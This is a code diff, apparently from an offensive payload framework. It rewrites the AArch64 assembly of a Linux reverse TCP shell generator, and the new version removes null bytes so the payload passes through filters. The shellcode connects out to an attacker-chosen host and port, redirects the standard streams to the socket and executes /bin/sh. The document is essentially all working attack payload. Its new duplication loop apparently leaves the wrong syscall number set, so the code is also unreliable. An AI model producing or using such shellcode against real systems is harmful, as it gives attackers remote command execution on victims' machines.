@@ -46,57 +46,42 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
 
         shellcode = f"""
         start:
-            mov x0, 0x2
-            mov x1, 0x1
-            mov x2, 0
-            mov x8, 0xc6
-            svc 0
+            mov x8, #198
+            lsr x1, x8, #7
+            lsl x0, x1, #1
+            mov x2, xzr
+            svc #0x1337
 
-            mov x3, x0
-            adr x1, sockaddr
-            mov x2, 0x10
-            mov x8, 0xcb
-            svc 0
+            mvn x4, x0
+            lsl x1, x1, #1
+            movk x1, #0x{rport.hex()}, lsl #16
+            movk x1, #0x{rhost[2:].hex()}, lsl #32
+            movk x1, #0x{rhost[:2].hex()}, lsl #48
+            str x1, [sp, #-8]!
+            add x1, sp, x2
+            mov x2, #16
+            mov x8, #203
+            svc #0x1337
 
-            cbnz w0, exit
-            mov x0, x3
-            mov x2, 0
-            mov x1, 0x0
-            mov x8, 0x18
-            svc 0
+            lsr x1, x2, #2
 
-            mov x1, 0x1
-            mov x8, 0x18
-            svc 0
+        dup:
+            mvn x0, x4
+            lsr x1, x1, #1
+            mov x2, xzr
+            svc #0x1337
 
-            mov x1, 0x2
-            mov x8, 0x18
-            svc 0
-
-            adr x0, shell
-            mov x2, 0
-            str x0, [sp, 0]
-            str x2, [sp, 8]
-            mov x1, sp
-            mov x8, 0xdd
-            svc 0
-
-        exit:
-            mov x0, 0
-            mov x8, 0x5d
-            svc 0
-
-        .balign 4
-        sockaddr:
-            .short 0x2
-            .short 0x{rport.hex()}
-            .word 0x{rhost.hex()}
-
-        shell:
-            .word 0x6e69622f
-            .word 0x0068732f
-            .word 0x00000000
-            .word 0x00000000
+            mov x10, xzr
+            cmp x10, x1
+            bne dup
+            mov x3, #0x622f
+            movk x3, #0x6e69, lsl #16
+            movk x3, #0x732f, lsl #32
+            movk x3, #0x68, lsl #48
+            str x3, [sp, #-8]!
+            add x0, sp, x1
+            mov x8, #221
+            svc #0x1337
         """
 
         if assemble:
